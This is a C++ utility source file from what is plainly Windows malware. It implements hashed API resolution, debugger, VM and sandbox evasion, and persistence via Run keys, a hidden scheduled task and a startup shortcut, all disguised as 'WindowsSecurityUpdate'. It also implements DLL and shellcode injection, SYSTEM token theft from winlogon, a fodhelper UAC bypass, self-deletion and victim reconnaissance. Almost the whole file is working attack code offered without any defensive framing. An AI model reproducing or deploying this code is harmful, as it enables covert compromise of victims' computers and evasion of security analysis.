#include "utils.h"
#include "config.h"
#include <tlhelp32.h>
#include <shellapi.h>
#include <iphlpapi.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <intrin.h>
#include <sstream>
#include <iomanip>
#include <cstdlib>
#include <ctime>
#include <random>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shlwapi.lib")

namespace Utils {
    // Simple XOR hash for API strings
    static DWORD HashString(const char* str) {
        DWORD hash = 5381;
        while (*str) {
            hash = ((hash << 5) + hash) ^ *str;
            str++;
        }
        return hash;
    }

    FARPROC GetProcAddr(HMODULE mod, const char* hash) {
        DWORD targetHash = HashString(hash);
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)mod + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mod + dir.VirtualAddress);

        DWORD* names = (DWORD*)((BYTE*)mod + exports->AddressOfNames);
        WORD* ordinals = (WORD*)((BYTE*)mod + exports->AddressOfNameOrdinals);
        DWORD* functions = (DWORD*)((BYTE*)mod + exports->AddressOfFunctions);

        for (DWORD i = 0; i < exports->NumberOfNames; i++) {
            const char* name = (const char*)mod + names[i];
            if (HashString(name) == targetHash) {
                return (FARPROC)((BYTE*)mod + functions[ordinals[i]]);
            }
        }
        return nullptr;
    }

    HMODULE GetModule(const char* hash) {
        DWORD targetHash = HashString(hash);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
        if (snap == INVALID_HANDLE_VALUE) return nullptr;

        MODULEENTRY32W me = { sizeof(me) };
        HMODULE result = nullptr;
        if (Module32FirstW(snap, &me)) {
            do {
                std::wstring wname(me.szModule);
                std::string name(wname.begin(), wname.end());
                for (auto& c : name) c = (char)tolower(c);
                if (name.size() > 4) name.resize(name.size() - 4);
                if (HashString(name.c_str()) == targetHash) {
                    result = me.hModule;
                    break;
                }
            } while (Module32NextW(snap, &me));
        }
        CloseHandle(snap);
        return result;
    }

    bool IsDebuggerAttached() {
        return IsDebuggerPresent() != 0;
    }

    bool IsVM() {
        std::vector<std::string> vmMacs = {
            "\x08\x00\x27", "\x00\x05\x69", "\x00\x0C\x29",
            "\x00\x1C\x42", "\x00\x50\x56", "\x00\x15\x5D"
        };

        ULONG bufLen = 0;
        GetAdaptersInfo(NULL, &bufLen);
        if (bufLen == 0) return false;

        PIP_ADAPTER_INFO pAdapter = (PIP_ADAPTER_INFO)GlobalAlloc(GPTR, bufLen);
        if (GetAdaptersInfo(pAdapter, &bufLen) != NO_ERROR) {
            GlobalFree(pAdapter);
            return false;
        }

        PIP_ADAPTER_INFO curr = pAdapter;
        while (curr) {
            for (const auto& mac : vmMacs) {
                if (memcmp(curr->Address, mac.c_str(), 3) == 0) {
                    GlobalFree(pAdapter);
                    return true;
                }
            }
            curr = curr->Next;
        }
        GlobalFree(pAdapter);

        // CPUID-based VM check
        int cpuInfo[4] = {0};
        __cpuid(cpuInfo, 1);
        if (cpuInfo[2] & (1 << 31)) return true; // Hypervisor present

        return false;
    }

    bool IsSandbox() {
        // Time acceleration check
        DWORD start = GetTickCount64();
        Sleep(3000);
        if (GetTickCount64() - start < 2500) return true;

        // Username blacklist
        char user[256];
        DWORD size = 256;
        GetUserNameA(user, &size);
        std::string username(user);
        std::vector<std::string> badNames = {"sandbox", "malware", "test", "virus",
                                              "user", "vmware", "virtualbox", "analysis"};
        for (const auto& n : badNames) {
            if (username.find(n) != std::string::npos) return true;
        }

        // Process count check
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe = { sizeof(pe) };
        int count = 0;
        if (Process32First(snap, &pe)) {
            do { count++; } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        if (count < 80) return true;

        // Disk size check
        ULARGE_INTEGER freeBytes, totalBytes;
        if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, NULL)) {
            if (totalBytes.QuadPart < 85899345920LL) return true; // < 80GB
        }

        // RAM check
        MEMORYSTATUSEX mem = { sizeof(mem) };
        GlobalMemoryStatusEx(&mem);
        if (mem.ullTotalPhys < 2147483648ULL) return true; // < 2GB

        return false;
    }

    bool ShouldExit() {
        return IsDebuggerAttached() || IsVM() || IsSandbox();
    }

    void InstallPersistence() {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);

        // Registry Run key (HKCU)
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
                          L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"WindowsSecurityUpdate", 0, REG_SZ,
                          (BYTE*)exePath,
                          (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
            RegCloseKey(hKey);
        }

        // Registry Run key (HKLM - requires admin)
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                          L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"WindowsSecurityUpdate", 0, REG_SZ,
                          (BYTE*)exePath,
                          (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
            RegCloseKey(hKey);
        }

        // Scheduled task
        wchar_t cmd[1024];
        swprintf_s(cmd, L"schtasks /create /tn \"WindowsSecurityUpdate\" /tr \"%s\" "
                   L"/sc onlogon /rl highest /f", exePath);
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};
        CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) {
            WaitForSingleObject(pi.hProcess, 10000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        // Startup folder shortcut
        wchar_t startupPath[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
        wchar_t shortcut[MAX_PATH];
        swprintf_s(shortcut, L"%s\\WindowsUpdate.lnk", startupPath);
        swprintf_s(cmd, L"powershell -WindowStyle Hidden -Command \""
                   L"$ws = New-Object -ComObject WScript.Shell; "
                   L"$sc = $ws.CreateShortcut('%s'); "
                   L"$sc.TargetPath = '%s'; "
                   L"$sc.Save()\"", shortcut, exePath);
        CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) {
            WaitForSingleObject(pi.hProcess, 10000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    void RemovePersistence() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
                          L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, L"WindowsSecurityUpdate");
            RegCloseKey(hKey);
        }

        wchar_t cmd[512];
        swprintf_s(cmd, L"schtasks /delete /tn \"WindowsSecurityUpdate\" /f");
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};
        CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        wchar_t startupPath[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
        wchar_t shortcut[MAX_PATH];
        swprintf_s(shortcut, L"%s\\WindowsUpdate.lnk", startupPath);
        DeleteFileW(shortcut);
    }

    DWORD FindProcess(const wchar_t* name) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe = { sizeof(pe) };
        DWORD pid = 0;
        if (Process32FirstW(snap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, name) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
        return pid;
    }

    HANDLE FindProcessHandle(const wchar_t* name) {
        DWORD pid = FindProcess(name);
        if (!pid) return NULL;
        return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    }

    bool InjectDLL(DWORD pid, const wchar_t* dllPath) {
        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProc) return false;

        SIZE_T pathLen = (wcslen(dllPath) + 1) * sizeof(wchar_t);
        LPVOID remoteMem = VirtualAllocEx(hProc, NULL, pathLen,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMem) { CloseHandle(hProc); return false; }

        WriteProcessMemory(hProc, remoteMem, dllPath, pathLen, NULL);

        HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
        LPTHREAD_START_ROUTINE loadLib = (LPTHREAD_START_ROUTINE)
            GetProcAddress(hKernel, "LoadLibraryW");

        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, loadLib, remoteMem, 0, NULL);
        if (!hThread) {
            VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProc);
            return false;
        }

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return true;
    }

    bool InjectShellcode(DWORD pid, const std::vector<BYTE>& shellcode) {
        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProc) return false;

        LPVOID remoteMem = VirtualAllocEx(hProc, NULL, shellcode.size(),
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteMem) { CloseHandle(hProc); return false; }

        WriteProcessMemory(hProc, remoteMem, shellcode.data(), shellcode.size(), NULL);

        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                             (LPTHREAD_START_ROUTINE)remoteMem,
                                             NULL, 0, NULL);
        if (!hThread) {
            VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProc);
            return false;
        }

        CloseHandle(hThread);
        CloseHandle(hProc);
        return true;
    }

    bool ElevateToSystem() {
        DWORD pid = FindProcess(L"winlogon.exe");
        if (!pid) return false;

        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProc) return false;

        HANDLE hToken = NULL;
        if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
            CloseHandle(hProc);
            return false;
        }

        HANDLE hDupToken = NULL;
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, FALSE };
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa,
                               SecurityImpersonation, TokenPrimary, &hDupToken)) {
            CloseHandle(hToken);
            CloseHandle(hProc);
            return false;
        }

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);

        BOOL result = CreateProcessWithTokenW(hDupToken, 0, exePath, NULL,
                                               CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (result) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProc);
        return result;
    }

    bool BypassUAC(const wchar_t* exePath) {
        // fodhelper.exe UAC bypass technique
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
                          L"Software\\Classes\\ms-settings\\shell\\open\\command",
                          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, NULL, 0, REG_SZ,
                          (BYTE*)exePath,
                          (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
            RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", 2);
            RegCloseKey(hKey);

            SHELLEXECUTEINFOW sei = { sizeof(sei) };
            sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
            sei.nShow = SW_HIDE;
            ShellExecuteExW(&sei);

            Sleep(5000);

            // Cleanup
            RegDeleteKeyW(HKEY_CURRENT_USER,
                          L"Software\\Classes\\ms-settings\\shell\\open\\command");
            return true;
        }
        return false;
    }

    bool WriteFileBinary(const std::string& path, const std::vector<BYTE>& data) {
        HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        DWORD written = 0;
        WriteFile(hFile, data.data(), (DWORD)data.size(), &written, NULL);
        CloseHandle(hFile);
        return written == data.size();
    }

    std::vector<BYTE> ReadFileBinary(const std::string& path) {
        HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        std::vector<BYTE> data(size);
        DWORD read = 0;
        ReadFile(hFile, data.data(), size, &read, NULL);
        CloseHandle(hFile);
        return data;
    }

    bool DeleteSelf() {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);

        // Move to delete on reboot
        MoveFileExW(exePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

        // Self-deleting batch script
        wchar_t batPath[MAX_PATH];
        GetTempPathW(MAX_PATH, batPath);
        wcscat_s(batPath, L"\\delself.bat");
        HANDLE hFile = CreateFileW(batPath, GENERIC_WRITE, 0, NULL,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            char content[512];
            int len = sprintf_s(content,
                "@echo off\n"
                ":loop\n"
                "del \"%ws\" >nul 2>&1\n"
                "if exist \"%ws\" goto loop\n"
                "del \"%%0\" >nul 2>&1\n",
                exePath, exePath);
            DWORD written = 0;
            WriteFile(hFile, content, len, &written, NULL);
            CloseHandle(hFile);

            STARTUPINFOW si = { sizeof(si) };
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi = {};
            CreateProcessW(NULL, batPath, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            if (pi.hProcess) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
        return true;
    }

    std::string WStringToString(const std::wstring& wstr) {
        if (wstr.empty()) return "";
        int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
        std::string result(len - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], len, NULL, NULL);
        return result;
    }

    std::wstring StringToWString(const std::string& str) {
        if (str.empty()) return L"";
        int len = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
        std::wstring result(len - 1, 0);
        MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], len);
        return result;
    }

    std::string GetTimestamp() {
        time_t now = time(0);
        tm* ltm = localtime(&now);
        char buf[64];
        sprintf_s(buf, "%04d-%02d-%02d %02d:%02d:%02d",
                  1900 + ltm->tm_year, 1 + ltm->tm_mon, ltm->tm_mday,
                  ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
        return std::string(buf);
    }

    std::string RandomString(size_t len) {
        static const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, sizeof(chars) - 2);
        std::string s(len, 0);
        for (size_t i = 0; i < len; i++) s[i] = chars[dis(gen)];
        return s;
    }

    void XORString(std::string& str, char key) {
        for (auto& c : str) c ^= key;
    }

    std::string GetHostname() {
        char buf[MAX_COMPUTERNAME_LENGTH + 1] = {};
        DWORD len = sizeof(buf);
        GetComputerNameA(buf, &len);
        return std::string(buf);
    }

    std::string GetUsername() {
        char buf[256] = {};
        DWORD len = 256;
        GetUserNameA(buf, &len);
        return std::string(buf);
    }

    std::string GetOSVersion() {
        OSVERSIONINFOEXA osvi = { sizeof(osvi) };
        #pragma warning(disable: 4996)
        GetVersionExA((OSVERSIONINFOA*)&osvi);
        std::stringstream ss;
        ss << "Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion
           << " Build " << osvi.dwBuildNumber;
        return ss.str();
    }

    std::string GetPublicIP() {
        return "0.0.0.0";
    }

    std::string GetWifiSSID() {
        // Implemented in wifi_info, return stub here
        return "";
    }

    DWORD GetIdleTime() {
        LASTINPUTINFO lii = { sizeof(lii) };
        if (GetLastInputInfo(&lii)) {
            return (GetTickCount() - lii.dwTime) / 1000;
        }
        return 0;
    }

    bool CreateSuspendedProcess(const wchar_t* path, PROCESS_INFORMATION* pi) {
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        return CreateProcessW(path, NULL, NULL, NULL, FALSE,
                               CREATE_SUSPENDED | CREATE_NO_WINDOW,
                               NULL, NULL, &si, pi) != 0;
    }

    void JitterSleep(DWORD baseMs, DWORD jitterMs) {
        if (jitterMs == 0) {
            Sleep(baseMs);
            return;
        }
        DWORD jitter = rand() % jitterMs;
        Sleep(baseMs + jitter);
    }

    bool CreateSingleton(const char* name) {
        HANDLE hMutex = CreateMutexA(NULL, TRUE, name);
        return (GetLastError() != ERROR_ALREADY_EXISTS);
    }
}
